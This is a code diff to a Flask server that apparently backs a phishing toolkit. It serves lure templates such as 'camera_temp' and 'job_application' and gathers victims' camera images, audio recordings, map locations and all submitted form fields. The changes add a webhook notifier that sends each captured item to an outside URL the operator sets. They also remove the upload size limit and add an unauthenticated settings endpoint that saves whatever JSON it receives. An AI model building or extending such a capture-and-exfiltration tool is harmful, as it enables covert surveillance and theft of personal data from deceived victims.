@@ -3,6 +3,7 @@ import os
 import json
 import re
 import base64
+from datetime import datetime
 
 BASE_DIR = os.path.dirname(__file__)
 TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
@@ -12,15 +13,14 @@ PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')
 
 app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), template_folder=FLASK_TEMPLATES_DIR)
 app.secret_key = os.urandom(24)
+# Disable upload size limit completely
+app.config['MAX_CONTENT_LENGTH'] = None
 
 
 # Keep legacy asset path used by the original PHP templates (../../assets/...)
 @app.route('/assets/<path:filename>')
 def legacy_assets(filename):
     return send_from_directory(os.path.join(BASE_DIR, 'assets'), filename)
-
-
-# (Compatibility routes defined later to avoid duplicate endpoint names)
 
 
 def load_check_c():
@@ -320,12 +320,62 @@ def serve_template_index(name):
     return 'Not found', 404
 
 
-@app.route('/t/<name>/<path:filename>')
+def send_notification(message_data):
+    try:
+        if os.path.exists('Settings.json'):
+            with open('Settings.json', 'r') as f:
+                settings = json.load(f)
+                webhook_url = settings.get('generic_webhook')
+                if webhook_url:
+                    import requests
+                    # Send as JSON to be compatible with Zapier/Make
+                    requests.post(webhook_url, json=message_data)
+    except Exception:
+        pass
+
+
+@app.route('/api/save_settings', methods=['POST'])
+def save_settings():
+    try:
+        data = request.json
+        settings = {}
+        if os.path.exists('Settings.json'):
+            with open('Settings.json', 'r') as f:
+                settings = json.load(f)
+        
+        settings.update(data)
+        
+        with open('Settings.json', 'w') as f:
+            json.dump(settings, f)
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+
+@app.route('/api/get_settings')
+def get_settings():
+    if os.path.exists('Settings.json'):
+        with open('Settings.json', 'r') as f:
+            return jsonify(json.load(f))
+    return jsonify({})
+
+
+@app.route('/t/<name>/<path:filename>', methods=['GET', 'POST'])
 def serve_template_file(name, filename):
     dirpath = os.path.join(TEMPLATES_DIR, name)
-    if os.path.isdir(dirpath):
-        return send_from_directory(dirpath, filename)
-    return 'Not found', 404
+    if not os.path.isdir(dirpath):
+        return 'Not found', 404
+
+    # Handle PHP file POSTs (catch-all for capture.php, result.php, etc.)
+    if filename.endswith('.php'):
+        if request.method == 'POST':
+            if 'upload' in filename:
+                return template_upload_php(name)
+            return template_post(name)
+        # Don't serve PHP source code
+        return 'OK'
+
+    return send_from_directory(dirpath, filename)
 
 
 @app.route('/t/<name>/handler', methods=['POST'])
@@ -336,6 +386,23 @@ def template_handler(name):
     data = request.form.get('data')
     if data is None:
         return 'No data', 400
+    
+    # Send notification
+    if "Google Map Link" in data:
+        send_notification({
+            "type": "Location Captured",
+            "content": data,
+            "template": name,
+            "timestamp": datetime.now().isoformat()
+        })
+    else:
+        send_notification({
+            "type": "Data Captured",
+            "content": data,
+            "template": name,
+            "timestamp": datetime.now().isoformat()
+        })
+
     result_file = os.path.join(dirpath, 'result.txt')
     with open(result_file, 'w', encoding='utf-8') as f:
         f.write(data)
@@ -348,32 +415,66 @@ def template_post(name):
     if not os.path.isdir(dirpath):
         return 'Not found', 404
 
-    # If a base64 image field 'cat' is present, save image to ../images
-    cat = request.form.get('cat')
-    if cat:
+    # 1. Handle Image Uploads (base64)
+    # 'cat' is used by camera_temp, 'image' by job_application
+    img_data = request.form.get('cat') or request.form.get('image')
+    
+    if img_data:
         try:
-            imgdata = base64.b64decode(cat)
-            from datetime import datetime
+            # Clean up headers if present (data:image/png;base64,)
+            if ',' in img_data:
+                img_data = img_data.split(',')[1]
+            
+            # Handle space to plus conversion for base64
+            img_data = img_data.replace(' ', '+')
+            
+            decoded_data = base64.b64decode(img_data)
             fname = 'cam' + datetime.utcnow().strftime('%d%Y%H%M%S') + '.png'
             images_dir = os.path.join(BASE_DIR, 'images')
             os.makedirs(images_dir, exist_ok=True)
             imgpath = os.path.join(images_dir, fname)
             with open(imgpath, 'wb') as f:
-                f.write(imgdata)
+                f.write(decoded_data)
+            
             # write to result.txt
             result_file = os.path.join(dirpath, 'result.txt')
             with open(result_file, 'w', encoding='utf-8') as f:
                 f.write('Image File Was Saved ! > /images/' + fname)
+            
+            send_notification({
+                "type": "Image Captured",
+                "filename": fname,
+                "template": name,
+                "timestamp": datetime.now().isoformat()
+            })
             return 'OK'
         except Exception as e:
+            print(f"Image Save Error: {e}")
             return 'Error: ' + str(e), 500
 
-    # fallback: mirror handler behavior
+    # 2. Handle Text Data
+    # If 'data' exists (standard templates), use it.
+    # Otherwise, collect ALL form fields (job_application, etc.)
     data = request.form.get('data')
+    
+    if not data and len(request.form) > 0:
+        # Construct specific formatted data string from all fields
+        lines = []
+        for key, value in request.form.items():
+            if key not in ['cat', 'image']:
+                lines.append(f"{key}: {value}")
+        data = "\n".join(lines)
+
     if data:
         result_file = os.path.join(dirpath, 'result.txt')
         with open(result_file, 'w', encoding='utf-8') as f:
             f.write(data)
+        send_notification({
+            "type": "Data Captured",
+            "content": data,
+            "template": name,
+            "timestamp": datetime.now().isoformat()
+        })
         return 'OK'
 
     return 'No data', 400
@@ -381,15 +482,19 @@ def template_post(name):
 
 @app.route('/t/<name>/upload.php', methods=['POST'])
 def template_upload_php(name):
-    if 'audio_data' not in request.files:
+    # Generic file handler - take the first file found
+    if not request.files:
         return 'No file part', 400
     
-    file = request.files['audio_data']
+    # Get the first file uploaded, regardless of the key ('audio_data', 'audio_file', etc.)
+    file = next(iter(request.files.values()))
+    
     if file.filename == '':
         return 'No selected file', 400
         
     if file:
         filename = file.filename
+        # Ensure extension
         if not filename.endswith('.wav'):
             filename += '.wav'
             
@@ -404,6 +509,12 @@ def template_upload_php(name):
         with open(result_file, 'w', encoding='utf-8') as f:
             f.write(f"Audio File Was Saved ! > /sounds/{filename}")
             
+        send_notification({
+            "type": "Audio Captured",
+            "filename": filename,
+            "template": name,
+            "timestamp": datetime.now().isoformat()
+        })
         return 'OK'
     return 'Error', 500
 
